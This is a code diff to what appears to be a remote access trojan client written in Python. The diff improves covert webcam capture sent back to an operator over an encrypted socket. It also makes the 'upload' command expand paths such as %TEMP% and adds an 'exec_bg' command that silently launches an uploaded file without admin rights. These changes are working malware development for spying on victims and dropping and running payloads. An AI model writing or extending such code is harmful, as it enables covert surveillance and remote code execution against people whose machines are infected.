@@ -389,31 +389,33 @@ def take_screenshot(sock, key, send_lock):
 def capture_webcam(sock, key, send_lock):
     if not WEBCAM_AVAILABLE:
         with send_lock:
-            send_msg(sock, "FAIL", key)
+            send_msg(sock, "FAIL: opencv-python not installed", key)
         return
     try:
-        cap = cv2.VideoCapture(0)
+        # Suppress CV2 VIDEOIO spam
+        os.environ.setdefault("OPENCV_LOG_LEVEL", "ERROR")
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW if platform.system() == "Windows" else cv2.CAP_ANY)
         if not cap.isOpened():
             with send_lock:
-                send_msg(sock, "FAIL", key)
+                send_msg(sock, "FAIL: no camera found (index 0 unavailable)", key)
             return
         ret, frame = cap.read()
         cap.release()
         if not ret:
             with send_lock:
-                send_msg(sock, "FAIL", key)
+                send_msg(sock, "FAIL: could not read frame from camera", key)
             return
         ret, buffer = cv2.imencode('.jpg', frame)
         if not ret:
             with send_lock:
-                send_msg(sock, "FAIL", key)
+                send_msg(sock, "FAIL: JPEG encode failed", key)
             return
         with send_lock:
             send_msg(sock, "PASS", key)
             send_msg(sock, buffer.tobytes(), key)
     except Exception as e:
         with send_lock:
-            send_msg(sock, "FAIL", key)
+            send_msg(sock, f"FAIL: {e}", key)
         logger.error(f"Webcam error: {e}")
 
 
@@ -768,8 +770,11 @@ def main():
 
                 elif command.startswith("upload "):
                     filename = command.split(" ", 1)[1]
+                    # Expand environment variables so %TEMP% etc. work
+                    filename = os.path.expandvars(filename)
                     file_data = recv_msg(client, key)
                     if file_data is not None:
+                        os.makedirs(os.path.dirname(os.path.abspath(filename)), exist_ok=True)
                         with open(filename, "wb") as f:
                             f.write(file_data)
                         with send_lock:
@@ -777,6 +782,21 @@ def main():
                     else:
                         with send_lock:
                             send_msg(client, "[!] Failed to receive file", key)
+
+                elif command.startswith("exec_bg "):
+                    # Launch a file in background without waiting (no admin needed)
+                    filepath = os.path.expandvars(command.split(" ", 1)[1].strip())
+                    try:
+                        if platform.system() == "Windows":
+                            os.startfile(filepath)
+                        else:
+                            subprocess.Popen([filepath], close_fds=True,
+                                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        with send_lock:
+                            send_msg(client, f"[+] Launched: {filepath}", key)
+                    except Exception as e:
+                        with send_lock:
+                            send_msg(client, f"[!] exec_bg failed: {e}", key)
 
                 elif command.startswith("download "):
                     filepath = command.split(" ", 1)[1]
